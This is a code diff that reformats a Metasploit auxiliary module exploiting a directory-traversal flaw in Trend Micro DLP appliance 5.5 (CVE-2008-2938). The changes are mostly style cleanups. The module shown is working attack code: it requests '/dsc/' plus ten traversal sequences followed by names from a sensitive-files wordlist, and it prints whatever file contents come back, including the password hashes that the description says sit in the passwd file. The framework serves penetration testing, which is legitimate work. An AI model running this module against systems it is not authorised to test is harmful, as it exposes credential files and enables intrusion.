@@ -9,8 +9,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'TrendMicro Data Loss Prevention 5.5 Directory Traversal',
-      'Description'    => %q{
+      'Name' => 'TrendMicro Data Loss Prevention 5.5 Directory Traversal',
+      'Description' => %q{
         This module tests whether a directory traversal vulnerablity is present
         in Trend Micro DLP (Data Loss Prevention) Appliance v5.5 build <= 1294.
         The vulnerability appears to be actually caused by the Tomcat UTF-8
@@ -19,18 +19,17 @@ class MetasploitModule < Msf::Auxiliary
         Note that in the Trend Micro appliance, /etc/shadow is not used and therefore
         password hashes are stored and anonymously accessible in the passwd file.
         },
-      'References'     =>
-        [
-          [ 'URL', 'http://tomcat.apache.org/' ],
-          [ 'OSVDB', '47464' ],
-          [ 'OSVDB', '73447' ],
-          [ 'CVE', '2008-2938' ],
-          [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
-          [ 'EDB', '17388' ],
-          [ 'BID', '48225' ],
-        ],
-      'Author'         => [ 'aushack' ],
-      'License'        => MSF_LICENSE,
+      'References' => [
+        [ 'URL', 'http://tomcat.apache.org/' ],
+        [ 'OSVDB', '47464' ],
+        [ 'OSVDB', '73447' ],
+        [ 'CVE', '2008-2938' ],
+        [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
+        [ 'EDB', '17388' ],
+        [ 'BID', '48225' ],
+      ],
+      'Author' => [ 'aushack' ],
+      'License' => MSF_LICENSE,
       'DisclosureDate' => 'Jan 9 2009'
     )
 
@@ -38,9 +37,12 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(8443),
         OptBool.new('SSL', [true, 'Use SSL', true]),
-        OptPath.new('SENSITIVE_FILES', [ true, "File containing senstive files, one per line",
-        File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-      ])
+        OptPath.new('SENSITIVE_FILES', [
+          true, 'File containing senstive files, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files.txt')
+        ]),
+      ]
+    )
   end
 
   def extract_words(wordfile)
@@ -59,44 +61,45 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => '/dsc/' + traversal*10 + files, # We know depth is 10
-        }, 25)
-    if (res and res.code == 200)
+        'method' => 'GET',
+        'uri' => '/dsc/' + traversal * 10 + files # We know depth is 10
+      }, 25
+    )
+    if (res && (res.code == 200))
       print_status("Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
       @files_found << files
-    elsif (res and res.code)
+    elsif (res && res.code)
       vprint_status("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
     end
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @files_found = []
 
     begin
       print_status("Attempting to connect to #{rhost}:#{rport}")
       res = send_request_raw(
         {
-          'method'  => 'GET',
-          'uri'     => '/dsc/',
-        }, 25)
+          'method' => 'GET',
+          'uri' => '/dsc/'
+        }, 25
+      )
 
-      if (res)
+      if res
         extract_words(datastore['SENSITIVE_FILES']).each do |files|
           find_files(files) unless files.empty?
         end
       end
 
-      if not @files_found.empty?
-        print_good("File(s) found:")
+      if !@files_found.empty?
+        print_good('File(s) found:')
 
         @files_found.each do |f|
           print_good(f)
         end
       else
-        print_good("No File(s) found")
+        print_error('No File(s) found')
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
